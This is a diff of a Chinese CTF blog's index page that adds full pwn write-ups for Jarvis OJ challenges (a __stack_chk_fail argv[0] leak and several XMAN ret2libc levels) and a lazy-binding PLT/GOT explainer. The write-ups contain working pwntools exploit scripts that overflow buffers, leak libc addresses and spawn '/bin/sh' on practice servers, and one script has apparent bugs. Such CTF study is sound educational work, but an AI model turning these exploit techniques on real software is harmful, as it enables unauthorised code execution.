@@ -303,14 +303,157 @@
 
       
         
-          <h1 id="栈溢出之利用-stack-chk-fail"><a href="#栈溢出之利用-stack-chk-fail" class="headerlink" title="栈溢出之利用__stack_chk_fail"></a>栈溢出之利用__stack_chk_fail</h1>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/03/04/栈溢出之利用-stack-chk-fail/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+          
+            <a id="more"></a>
+<p>程序的主函数很明显_IO_gets存在栈溢出。</p>
+<p>查看开启的保护机制，开了一大堆。。。</p>
+<pre><code>gdb-peda$ checksec 
+CANARY    : ENABLED
+FORTIFY   : ENABLED
+NX        : ENABLED
+PIE       : disabled
+RELRO     : disabled
+</code></pre><p>这题是国外的一个CTF题目，他利用的是fortify的报错泄露信息，在栈溢出的时候，数组越界写入，导致 canary值被修改。在函数退出时检查canary，发现canary被修改，函数不能安全返回，call到__stack_chk_fail打印argv[0]这个指针指向的字符串，默认是程序的名字。所以如果我们把它覆盖为flag的地址时，它就会把flag给打印出来。</p>
+<pre><code>void
+__attribute__ ((noreturn))
+__stack_chk_fail (void)
+  {
+     __fortify_fail (&quot;stack smashing detected&quot;);
+  }
+void
+__attribute__ ((noreturn)) internal_function
+__fortify_fail (const char *msg)
+  {
+    /* The loop is added only to keep gcc happy.  */
+    while (1)
+      __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,
+              msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);
+  }
+</code></pre><p>我们可以自己尝试将程序溢出</p>
+<pre><code>@ubuntu:~/Desktop$ python -c &apos;print &quot;A&quot;*0x200+&quot;\n&quot;+&quot;a&quot;&apos;| ./smashes
+Hello!
+What&apos;s your name? Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
+Please overwrite the flag: Thank you, bye!
+*** stack smashing detected ***: ./smashes terminated
+Aborted (core dumped)
+</code></pre><p>下一步就是计算argv[0]到缓冲区的距离</p>
+<pre><code>gdb-peda$ b *0x0040080e
+Breakpoint 1 at 0x40080e
+gdb-peda$ r
+Starting program: /home/longlong/Desktop/smashes 
+Hello!
+What&apos;s your name? [----------------------------------registers-----------------------------------]
+RAX: 0x19 
+RBX: 0x0 
+RCX: 0x7ffff7b00710 (&lt;__write_nocancel+7&gt;:    cmp    rax,0xfffffffffffff001)
+RDX: 0x19 
+RSI: 0x7ffff7dd59e0 --&gt; 0x0 
+RDI: 0x7fffffffdcb0 --&gt; 0x7ffff7a25078 --&gt; 0xc001200003322 
+RBP: 0x0 
+RSP: 0x7fffffffdcb0 --&gt; 0x7ffff7a25078 --&gt; 0xc001200003322 
+RIP: 0x40080e (call   0x4006c0 &lt;_IO_gets@plt&gt;)
+R8 : 0x7ffff7fdb740 (0x00007ffff7fdb740)
+R9 : 0x400934 (&quot;Hello!\nWhat&apos;s your name? &quot;)
+R10: 0x7ffff7fdb740 (0x00007ffff7fdb740)
+R11: 0x246 
+R12: 0x4006ee (xor    ebp,ebp)
+R13: 0x7fffffffdec0 --&gt; 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x400804:    xor    eax,eax
+   0x400806:    call   0x4006b0 &lt;__printf_chk@plt&gt;
+   0x40080b:    mov    rdi,rsp
+=&gt; 0x40080e:    call   0x4006c0 &lt;_IO_gets@plt&gt;
+   0x400813:    test   rax,rax
+   0x400816:    je     0x40089f
+   0x40081c:    mov    rdx,rsp
+   0x40081f:    mov    esi,0x400960
+Guessed arguments:
+arg[0]: 0x7fffffffdcb0 --&gt; 0x7ffff7a25078 --&gt; 0xc001200003322 
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffdcb0 --&gt; 0x7ffff7a25078 --&gt; 0xc001200003322 
+0008| 0x7fffffffdcb8 --&gt; 0x7ffff7ff74c0 --&gt; 0x7ffff7a15000 --&gt; 0x10102464c457f 
+0016| 0x7fffffffdcc0 --&gt; 0x7fffffffde10 --&gt; 0x0 
+0024| 0x7fffffffdcc8 --&gt; 0x7ffff7ff7a10 --&gt; 0x400458 (&quot;GLIBC_2.2.5&quot;)
+0032| 0x7fffffffdcd0 --&gt; 0x1 
+0040| 0x7fffffffdcd8 --&gt; 0x7ffff7ffe520 --&gt; 0x7ffff7ffe480 --&gt; 0x7ffff7ff79c8 --&gt; 0x7ffff7ffe1c8 --&gt; 0x0 
+0048| 0x7fffffffdce0 --&gt; 0x7ffff7ffe1c8 --&gt; 0x0 
+0056| 0x7fffffffdce8 --&gt; 0x7ffff7de4961 (&lt;_dl_lookup_symbol_x+305&gt;:    cmp    eax,0x0)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x000000000040080e in ?? ()
+gdb-peda$ find /home
+Searching for &apos;/home&apos; in: None ranges
+Found 8 results, display max 8 items:
+[stack] : 0x7fffffffe253 (&quot;/home/longlong/Desktop/smashes&quot;)
+[stack] : 0x7fffffffeafc (&quot;/home/longlong/.virtualenvs&quot;)
+[stack] : 0x7fffffffeb69 (&quot;/home/longlong/Devel&quot;)
+[stack] : 0x7fffffffec50 (&quot;/home/longlong/.virtualenvs&quot;)
+[stack] : 0x7fffffffec70 (&quot;/home/longlong/Desktop&quot;)
+[stack] : 0x7fffffffed82 (&quot;/home/longlong&quot;)
+[stack] : 0x7fffffffefa5 (&quot;/home/longlong/.Xauthority&quot;)
+[stack] : 0x7fffffffefd9 (&quot;/home/longlong/Desktop/smashes&quot;)
+gdb-peda$ find 0x7fffffffe253
+Searching for &apos;0x7fffffffe253&apos; in: None ranges
+Found 2 results, display max 2 items:
+   libc : 0x7ffff7dd4018 --&gt; 0x7fffffffe253 (&quot;/home/longlong/Desktop/smashes&quot;)
+[stack] : 0x7fffffffdec8 --&gt; 0x7fffffffe253 (&quot;/home/longlong/Desktop/smashes&quot;) 
+gdb-peda$ distance $rsp 0x7fffffffdec8
+From 0x7fffffffdcb0 to 0x7fffffffdec8: 536 bytes, 134 dwords
+</code></pre><p>通过gdb计算可以知道argv[0]到缓冲区的距离是0x218字节。</p>
+<p>查找发现flag同样存储在制度存储器0x400d20这个位置</p>
+<pre><code>gdb-peda$ find PCTF
+Searching for &apos;PCTF&apos; in: None ranges
+Found 2 results, display max 2 items:
+smashes : 0x400d20 (&quot;PCTF{Here&apos;s the flag on server}&quot;)
+smashes : 0x600d20 (&quot;PCTF{Here&apos;s the flag on server}&quot;)
+</code></pre><p>本地覆盖结果如下：</p>
+<pre><code>@ubuntu:~/Desktop$ python -c &apos;print &quot;a&quot;*0x218+&quot;\x20\x0d\x40\x00\x00\x00\x00\x00&quot;+&quot;\n&quot;+&quot;a&quot;&apos; | ./smashes
+Hello!
+What&apos;s your name? Nice to meet you, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 
+Please overwrite the flag: Thank you, bye!
+*** stack smashing detected ***: PCTF{Here&apos;s the flag on server} terminated
+Aborted (core dumped)
+</code></pre><p>提示flag在服务器上，然而远程连接过去是不会成功的。</p>
+<p>注意不要用原来flag的地址覆盖，因为原来存储flag的地方会被overwrite。但是由于ELF的映射方式，此flag会被映射两次，另外一个地方flag的内容不会变。</p>
+<p>原因是<strong>stack_chk_fail会调用</strong>libc_message</p>
+<pre><code>void
+__libc_message (int do_abort, const char *fmt, ...)
+{
+  va_list ap; 
+  int fd = -1; 
+  va_start (ap, fmt);
+  /* Open a descriptor for /dev/tty unless the user explicitly
+     requests errors on standard error.  */
+  const char *on_2 = __libc_secure_getenv (&quot;LIBC_FATAL_STDERR_&quot;);
+  if (on_2 == NULL || *on_2 == &apos;\0&apos;)
+    fd = open_not_cancel_2 (_PATH_TTY, O_RDWR | O_NOCTTY | O_NDELAY);
+  if (fd == -1) 
+    fd = STDERR_FILENO;
+  /*......*/
+}
+</code></pre><p>如果LIBC_FATAL<em>STDERR</em>环境变量没有设置或者为空，stderr会redirect到_PATH_TTY，通常是/dev/tty，因此错误信息将不会输出到stderr而是服务端可见的设备。<br>所以我们必须设置这个环境变量，正好可以用这个环境变量去覆盖flag的内容。</p>
+<p>最终exp:</p>
+<pre><code>from pwn import *
+old_flag_addr = 0x600d20
+new_flag_addr = 0x400d20
+#p = process(&apos;./smashes&apos;)
+p = remote(&apos;pwn.jarvisoj.com&apos;, 9877)
+p.recvuntil(&quot;name?&quot;)
+payload = &quot;a&quot;*0x218 + p64(new_flag_addr) 
+payload += p64(0) + p64(old_flag_addr)
+p.sendline(payload)
+p.recvuntil(&quot;flag: &quot;)
+env = &quot;LIBC_FATAL_STDERR_=1&quot;
+p.sendline(env)
+flag = p.recv()
+print flag
+</code></pre><p>根据glibc的源码可知，只要程序开了canary栈保护，就可以覆盖argv[0]来泄露想要的信息(&amp;set LIBC_FATAL<em>STDERR</em>=1)。</p>
+
+          
         
       
     </div>
@@ -427,14 +570,48 @@
 
       
         
-          <h1 id="XMAN-level4"><a href="#XMAN-level4" class="headerlink" title="XMAN-level4"></a>XMAN-level4</h1>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/02/28/XMAN-level4/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+          
+            <a id="more"></a>
+<p>本题其实就是level3的一个升级版本，唯一的区别就是本题没有提供libc，可以通过DynELF泄漏函数真实地址。有一个地方需要注意，leak函数可以在write之后直接pop三个参数再返回main：</p>
+<pre><code>payload+=p32(write_plt)+p32(pppr)+p32(1)+p32(address)+p32(4)+p32(main)
+</code></pre><p>也可以重新返回vuln：</p>
+<pre><code>payload+=p32(write_plt)+p32(vlun)+p32(1)+p32(address)+p32(4)
+</code></pre><p>脚本如下：</p>
+<pre><code>from pwn import *
+
+#p=process(&apos;./level4&apos;)
+p=remote(&apos;pwn2.jarvisoj.com&apos;,9880)
+level4=ELF(&apos;./level4&apos;)
+
+#plt
+write_plt=0x08048340
+read_plt=0x08048310
+
+#addr
+main=level4.symbols[&apos;main&apos;]
+basebss=level4.bss()
+pppr=0x08048509
+
+def leak(address):
+        payload=&apos;A&apos;*140
+    payload+=p32(write_plt)+p32(pppr)+p32(1)+p32(address)+p32(4)+p32(main)
+        p.send(payload)
+        data =p.recv(4)
+    print &quot;%#x %s&quot; % (address, data)
+        return data
+
+
+d = DynELF(leak, elf=ELF(&apos;./level4&apos;))
+
+system_addr = d.lookup(&apos;system&apos;,&apos;libc&apos;)
+log.success(&apos;leak system address: &apos; + hex(system_addr))
+
+payload2=&apos;A&apos;*140+p32(read_plt)+p32(pppr)+p32(0)+p32(basebss)+p32(8)+p32(system_addr)+p32(main)+p32(basebss)
+p.send(payload2)
+p.send(&apos;/bin/sh\x00&apos;)
+p.interactive()
+</code></pre>
+          
         
       
     </div>
@@ -551,14 +728,54 @@
 
       
         
-          <h1 id="XMAN-Level3-x64"><a href="#XMAN-Level3-x64" class="headerlink" title="XMAN-Level3-x64"></a>XMAN-Level3-x64</h1>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/02/27/XMAN-Level3-x64/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+          
+            <a id="more"></a>
+<p>这个题目和XMAN-Level2-x64考察目的是一样的，都是考察在x64中传参数的问题，这个题目是如何考察在x64中传多个参数。</p>
+<p>由于本题目需要通过write泄漏实际地址，因此需要传递多个参数，rdx这个寄存器在程序中没有找到合适的gadget，但是通过调试会发现rdx这个值比较大，我们需要传入的也是一个较大的值便于进行write和read，这样就可以不用设置这样一个rdx的值。</p>
+<p>还有个问题是在运行脚本的时候发现，目标机上程序调用的并不是给的那个库，而是libc.so.6。脚本如下：</p>
+<pre><code>from pwn import *
+# p = process(&apos;./level3_x64&apos;)  # local
+libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)
+# context.log_level = &apos;debug&apos;
+p = remote(&apos;pwn2.jarvisoj.com&apos;, 9883)  # remote
+# libc = ELF(&apos;libc-2.19.so&apos;)  # remote
+elf = ELF(&apos;./level3_x64&apos;)
+# offest
+readoffest = libc.symbols[&apos;read&apos;]
+systemoffest = libc.symbols[&apos;system&apos;]
+# plt
+readplt = elf.plt[&apos;read&apos;]
+writeplt = elf.plt[&apos;write&apos;]
+# got
+readgot = elf.got[&apos;read&apos;]
+# addr
+basebss = elf.bss()
+rdiret = 0x00000000004006b3
+rsiret = 0x00000000004006b1
+vuladdr = 0x00000000004005E6
+payload = &quot;A&quot;*136 
+payload+= p64(rdiret) + p64(1) #write函数的第一个参数 
+payload+= p64(rsiret) + p64(readgot) #write函数的第二个参数，待显示字符串的首地址
+payload+= p64(8) #write函数的第三个参数，待显示字符串的字节数
+payload+= p64(writeplt) + p64(vuladdr)
+p.recvuntil(&apos;Input:\n&apos;)
+# gdb.attach(p)
+p.send(payload)
+readaddr = u64(p.recv(8))
+systemaddr = readaddr - readoffest + systemoffest
+payload  = &quot;A&quot;*136 
+payload += p64(rdiret) + p64(0) #read函数的第一个参数，stdin
+payload += p64(rsi2ret) + p64(basebss)#read函数的第二个参数，待写入地址空间的首地址
+payload += p64(888)  #read函数的第三个参数，待写入字符串的长度
+payload += p64(readaddr)
+payload += p64(rdiret) #read函数的第一个参数
+payload += p64(basebss) #read函数的第二个参数，待写入地址空间的首地址 
+payload += p64(systemaddr) 
+sh.send(payload)
+sh.send(&apos;/bin/sh\x00&apos;)
+sh.interactive()
+</code></pre>
+          
         
       
     </div>
@@ -675,14 +892,51 @@
 
       
         
-          <h1 id="X-MAN-level3"><a href="#X-MAN-level3" class="headerlink" title="X-MAN-level3"></a>X-MAN-level3</h1>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/02/24/X-MAN-level3/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+          
+            <a id="more"></a>
+<p>本题主要考察通过延迟绑定技术泄漏函数的真实地址，<a href="http://yunnigu.dropsec.xyz/2017/02/24/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/">延迟绑定技术</a>,通过GDB调试会发现程序开启了NX保护。而且也找不到system函数和bin/sh，</p>
+<p>首先需要泄漏write函数的地址用来求出system和bin/sh的实际地址，构造payload=‘A’*140+p32(writeplt) +p32(vuladdr)+ p32(1) + p32(writegot) + p32(4)<br>返回地址改为溢出发现的函数地址是为了接下来第二个payload的构造，因为函数每次运行的个函数的实际地址是不同的。后面的三个是write函数的三个参数，通过延迟绑定原理将write的实际地址写出来。</p>
+<p>第二个payload就是直接修改返回地址为system真实地址再加上bin/sh的地址就可以实现利用。脚本如下：</p>
+<pre><code>from pwn import *
+
+#p=process(&apos;./level3&apos;)
+#libc=ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)
+#context.log_level = &apos;debug&apos;
+p=remote(&apos;pwn2.jarvisoj.com&apos;,9879)
+
+level2=ELF(&apos;./level3&apos;)
+libc=ELF(&apos;libc-2.19.so&apos;)
+#offest
+writeoffest = libc.symbols[&apos;write&apos;]
+print writeoffest
+systemoffest = libc.symbols[&apos;system&apos;]
+print systemoffest
+binshoffest=0x0016084C
+#plt
+writeplt=0x08048340
+#got
+writegot=0x0804A018
+#addr
+basebss = 0x0804A024
+pop3ret = 0x08048519
+vuladdr = 0x0804844B
+
+payload=&apos;A&apos;*140+p32(writeplt) +p32(vuladdr)+ p32(1) + p32(writegot) + p32(4)
+
+p.recvuntil(&apos;Input:\n&apos;)
+p.send(payload)
+writeaddr=u32(p.recv(4))
+print writeaddr
+
+systemaddr = writeaddr - writeoffest + systemoffest
+binshaddr = writeaddr - writeoffest + binshoffest
+
+payload=&apos;a&apos;*140+p32(systemaddr)+p32(4)+p32(binshaddr)
+
+p.send(payload)
+p.interactive()
+</code></pre>
+          
         
       
     </div>
@@ -799,7 +1053,7 @@
 
       
         
-          <h1 id="X-MAN-level0-level2"><a href="#X-MAN-level0-level2" class="headerlink" title="X-MAN(level0~level2)"></a>X-MAN(level0~level2)</h1>
+          <p>题目资源在<a href="https://www.jarvisoj.com">这里</a><br>
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2017/02/24/X-MAN-level0-level2/#more" rel="contents">
@@ -923,14 +1177,63 @@
 
       
         
-          <h1 id="延迟绑定技术原理"><a href="#延迟绑定技术原理" class="headerlink" title="延迟绑定技术原理"></a>延迟绑定技术原理</h1>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/02/24/延迟绑定技术原理/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+          
+            <a id="more"></a>
+<p>动态链接比静态链接灵活，但牺牲了性能，据统计ELF程序在静态链接下比动态库快大约1%~5%。<br>主要原因是，动态链接下对于全局和静态数据的访问都要进行复杂的GOT定位，然后间接寻址，对于模块间的调用也要先定位GOT，然后进行间接跳转。<br>另外，动态链接的链接过程是在运行时完成的，动态链接器会寻找并转载所需要的对象，然后进行符号查找地址重定位等工作。</p>
+<p>延迟绑定的实现步骤如下：</p>
+<p>建立一个 GOT.PLT 表，该表用来放全局函数的实际地址，但最开始时，该里面放的不是真实的地址而是一个跳转，接下来会讲。<br>对每一个全局函数，链接器生成一个与之相对应的影子函数，如 fun@plt。<br>所有对 fun 的调用，都换成对 fun@plt 的调用，每个fun@plt 长成如下样子：</p>
+<pre><code>fun@plt:
+jmp *(fun@got.plt)
+push index
+jmp _init
+</code></pre><p>其中第一条指令直接从 got.plt 中去拿真实的函数地址，如果已经之前已经发生过调用，got.plt 就已经保存了真实的地址，如果是第一次调用，则 got.plt 中放的是 fun@plt 中的第二条指令，这就使得当执行第一次调用时，fun@plt中的第一条指令其实什么事也没做，直接继续往下执行，第二条指令的作用是把当前要调用的函数在 got.plt 中的编号作为参数传给 _init()，而 _init() 这个函数则用于把 fun 进行重定位，然后把结果写入到 got.plt 相应的地方，最后直接跳过去该函数。</p>
+<p>仍然是使用前面的例子，我们看看 g_func2 是怎样调用 g_func 的:</p>
+<pre><code>0000052f &lt;g_func2&gt;:
+ 52f:   55                      push   %ebp
+ 530:   89 e5                   mov    %esp,%ebp
+ 532:   53                      push   %ebx
+ 533:   83 ec 14                sub    $0x14,%esp
+ 536:   e8 00 00 00 00          call   53b &lt;g_func2+0xc&gt;
+ 53b:   5b                      pop    %ebx
+ 53c:   81 c3 91 11 00 00       add    $0x1191,%ebx
+ 542:   c7 45 f8 02 00 00 00    movl   $0x2,0xfffffff8(%ebp) // a = 2
+ 549:   83 ec 0c                sub    $0xc,%esp
+ 54c:   6a 03                   push   $0x3 // push argument 3 for g_func.
+ 54e:   e8 d5 fe ff ff          call   428 &lt;g_func@plt&gt;
+ 553:   83 c4 10                add    $0x10,%esp
+ 556:   89 45 f4                mov    %eax,0xfffffff4(%ebp)
+ 559:   8b 45 f4                mov    0xfffffff4(%ebp),%eax
+ 55c:   03 45 f8                add    0xfffffff8(%ebp),%eax
+ 55f:   8b 5d fc                mov    0xfffffffc(%ebp),%ebx
+ 562:   c9                      leave  
+ 563:   c3                      ret 
+</code></pre><p>如上汇编，指令 536, 53b, 53c, 用于计算 got.plt 的具体位置，计算方式与前面对数据的访问原理是一样的，经计算此时, %ebx = 0x53b + 0x1191 = 0x16cc, 注意指令 54e， 该指令调用了函数 g_func@plt:</p>
+<pre><code>00000428 &lt;g_func@plt&gt;:
+ 428:   ff a3 0c 00 00 00       jmp    *0xc(%ebx)
+ 42e:   68 00 00 00 00          push   $0x0
+ 433:   e9 e0 ff ff ff          jmp    418 &lt;_init+0x18&gt;
+</code></pre><p>注意到此时， %ebx 中放的是 got.plt 的地址，g_func@plt 的第一条指令用于获取 got.plt 中 func 的具体地址， func 放在 0xc + %ebx = 0xc + 0x16cc = 0x16d8, 这个地址里放的是什么呢？我们查一下重定位表：</p>
+<pre><code>-bash-3.00$ objdump -R liba.so
+
+liba.so:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+000016e0 R_386_RELATIVE    *ABS*
+000016e4 R_386_RELATIVE    *ABS*
+000016bc R_386_GLOB_DAT    g_share
+000016c0 R_386_GLOB_DAT    __cxa_finalize
+000016c4 R_386_GLOB_DAT    _Jv_RegisterClasses
+000016c8 R_386_GLOB_DAT    __gmon_start__
+000016d8 R_386_JUMP_SLOT   g_func
+000016dc R_386_JUMP_SLOT   __cxa_finalize
+</code></pre><p>可见，该地址里放的就是 g_func 的具体地址，那此时 0x16d8 放的是真正的地址了吗？我们再看看 got.plt:</p>
+<pre><code>Contents of section .got.plt:
+ 16cc fc150000 00000000 00000000 2e040000  ................
+ 16dc 3e040000 
+</code></pre><p>16d8 处的内容是: 2e040000, 小端序，换回整形就是 0x000042e, 该地址就是 fun@plt 的第二条指令！</p>
+
+          
         
       
     </div>
@@ -1047,7 +1350,7 @@
 
       
         
-          <h1 id="reverse之第十更"><a href="#reverse之第十更" class="headerlink" title="reverse之第十更"></a>reverse之第十更</h1>
+          <p>一道比较复杂的算法Crack，主要考查CRC校验算法，AES加密，以及base64加密算法。<br>
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2017/02/05/reverse之第十更/#more" rel="contents">
@@ -1171,7 +1474,7 @@
 
       
         
-          <h1 id="reverse之第九更"><a href="#reverse之第九更" class="headerlink" title="reverse之第九更"></a>reverse之第九更</h1><p>转载来自看雪论坛@PEdiy.com </p>
+          <p>转载来自看雪论坛@PEdiy.com<br>
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2017/02/04/reverse之第九更/#more" rel="contents">
@@ -1225,7 +1528,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yunnigu.dropsec.xyz/2017/01/30/reverse之第八更/">
+    <link itemprop="mainEntityOfPage" href="http://yunnigu.dropsec.xyz/2017/01/24/reverse之第六更/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Yun">
@@ -1244,7 +1547,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2017/01/30/reverse之第八更/" itemprop="url">reverse之第八更</a></h1>
+                <a class="post-title-link" href="/2017/01/24/reverse之第六更/" itemprop="url">reverse之第六更</a></h1>
         
 
         <div class="post-meta">
@@ -1256,8 +1559,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-01-30T11:43:54+08:00">
-                2017-01-30
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-01-24T15:11:01+08:00">
+                2017-01-24
               </time>
             
 
@@ -1295,10 +1598,10 @@
 
       
         
-          <h1 id="reverse之第八更"><a href="#reverse之第八更" class="headerlink" title="reverse之第八更"></a>reverse之第八更</h1>
+          <p>本题同样也涉及到反调试技术，题目提供一个exe和一个dll，用IDA分析程序：<br>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2017/01/30/reverse之第八更/#more" rel="contents">
+            <a class="btn" href="/2017/01/24/reverse之第六更/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1349,7 +1652,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yunnigu.dropsec.xyz/2017/01/26/reverse之第七更/">
+    <link itemprop="mainEntityOfPage" href="http://yunnigu.dropsec.xyz/2017/01/20/reverse之第四更/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Yun">
@@ -1368,7 +1671,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2017/01/26/reverse之第七更/" itemprop="url">reverse之第七更</a></h1>
+                <a class="post-title-link" href="/2017/01/20/reverse之第四更/" itemprop="url">reverse之第四更</a></h1>
         
 
         <div class="post-meta">
@@ -1380,8 +1683,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-01-26T13:40:45+08:00">
-                2017-01-26
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-01-20T16:41:40+08:00">
+                2017-01-20
               </time>
             
 
@@ -1419,10 +1722,10 @@
 
       
         
-          <h1 id="reverse之第七更"><a href="#reverse之第七更" class="headerlink" title="reverse之第七更"></a>reverse之第七更</h1>
+          <p>首先读取文件的头四个字节判断是否是0x33465443，不是提示“你打开的不是.ctf加密文件”。<br>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2017/01/26/reverse之第七更/#more" rel="contents">
+            <a class="btn" href="/2017/01/20/reverse之第四更/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1464,7 +1767,7 @@
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -1510,7 +1813,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">32</span>
+                  <span class="site-state-item-count">26</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1523,7 +1826,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-count">16</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
